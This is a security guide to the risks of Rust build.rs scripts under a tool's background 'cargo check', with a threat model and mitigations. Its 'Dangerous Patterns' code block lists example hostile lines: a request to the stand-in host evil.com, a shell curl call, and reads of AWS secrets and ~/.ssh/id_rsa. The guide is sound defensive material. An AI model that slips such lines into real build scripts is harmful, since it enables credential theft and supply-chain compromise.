# Build Script (build.rs) Security

## Overview

Rust's `build.rs` scripts execute during compilation with **full user privileges**. SYNAPSEED's Shadow Compiler runs `cargo check` in the background, which automatically executes all `build.rs` scripts in the dependency tree.

This is not a SYNAPSEED-specific risk — it affects any `cargo build`, `cargo check`, or `cargo test` invocation. SYNAPSEED surfaces this risk because background compilation happens automatically on file changes.

## Threat Model

### Attack Vectors

| Vector | Risk | Likelihood |
| :--- | :--- | :--- |
| Untrusted project with malicious `build.rs` | Arbitrary code execution | Medium |
| Compromised dependency update | Supply chain backdoor | Low-Medium |
| Transitive dependency with hidden `build.rs` | Indirect code execution | Low |

### Data at Risk

A malicious `build.rs` can access:

- **SSH keys** (`~/.ssh/`)
- **Cloud credentials** (`~/.aws/`, `~/.gcloud/`)
- **Git credentials** (`~/.gitconfig`, credential helpers)
- **Environment variables** (`$GITHUB_TOKEN`, `$AWS_SECRET_ACCESS_KEY`, etc.)
- **File system** (full read access to any user-readable path)
- **Network** (exfiltrate data to external servers)

## Dangerous Patterns in build.rs

When reviewing `build.rs` files, watch for:

```rust
// Network I/O — can exfiltrate data
reqwest::blocking::get("https://evil.com/collect");

// Shell execution — arbitrary command execution
std::process::Command::new("sh").arg("-c").arg("curl ...");

// Environment variable access — reads secrets
std::env::var("AWS_SECRET_ACCESS_KEY");

// File system reads outside project — credential theft
std::fs::read_to_string(dirs::home_dir().unwrap().join(".ssh/id_rsa"));

// File writes outside target/ — source tree modification
std::fs::write("src/backdoor.rs", malicious_code);
```

## Mitigations

### 1. Disable Shadow Compiler (Untrusted Projects)

Add to `.synapseed/dna.yaml`:

```yaml
hci:
  shadow_check: false
```

This prevents automatic `cargo check` execution. You can still run `cargo check` manually when ready.

### 2. Review build.rs Before Opening

```bash
# Find all build.rs files in a project
find . -name "build.rs" -not -path "*/target/*"

# Check dependencies for build scripts
cargo metadata --format-version=1 | jq '.packages[].targets[] | select(.kind[] == "custom-build") | .src_path'
```

### 3. Environment Hardening

- Never run `cargo check` in shells with production credentials in environment variables
- Use credential managers that isolate access (AWS Vault, 1Password CLI)
- CI/CD: scope secrets per-job, never expose globally

### 4. Safe Project Onboarding

1. Clone in isolated environment (container or VM)
2. Review all `build.rs` files
3. Review `Cargo.lock` for suspicious dependencies
4. Only then open with SYNAPSEED

## Shadow Compiler Specifics

The Shadow Compiler uses a separate target directory (`/tmp/synapseed-shadow-{hash}`) to avoid lock contention. It enforces disk limits (max 2GB, 7-day TTL) on shadow targets.

All `cargo check` invocations are logged:

```
[INFO] Shadow: Background compiler active
[DEBUG] Shadow: cargo check complete (10s, 5 errors, 12 warnings)
```

Enable full tracing: `RUST_LOG=synapseed_shadow_check=debug`
